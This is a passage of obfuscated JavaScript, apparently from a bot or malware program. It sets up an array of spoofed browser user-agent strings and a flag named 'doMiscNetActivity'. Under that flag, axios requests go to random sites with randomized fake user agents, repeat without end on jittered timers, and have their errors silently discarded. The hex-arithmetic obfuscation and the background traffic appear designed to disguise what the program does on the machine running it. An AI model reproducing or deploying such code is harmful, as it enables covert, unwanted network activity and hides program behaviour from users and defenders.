      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1d9 + -0x5f + -0x12 * 0x15; k < -0x21e7 + 0x1830 + 0x9bb; k++)
    setTimeout(f, (-0x41a * 0x1e + -0x1a7df + -0x1 * -0x30d4b) * k * getRandomInt(-0xe59 + 0x3b8 + 0xaa2, -0x1f5 * 0xb + 0x2168 + -0xbde));
  setInterval(() => {
    f();
    for (let l = -0x2289 + -0xa6 * -0x3b + 0x1 * -0x3b9; l < -0x1710 * -0x1 + 0x1b52 + 0x325e * -0x1; l++)
      setTimeout(f, (0x15d * -0x12f + 0xdf67 * -0x2 + 0x44641) * l * getRandomInt(-0x19bb + 0x1a86 + 0x2 * -0x65, 0x376 * -0x4 + -0x21a + 0xff5));
  }, 0x63e5af + -0xab33d + -0x2243f2);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x25 * -0xed + -0x31 * -0xf6 + -0x35ff) * getRandomInt(0x7 * -0x542 + 0x1229 * 0x2 + 0x7d, -0x1 * 0xa89 + 0x5a4 + 0x4ea));
}, 0x1ed6 + 0x11b8 + -0x302a);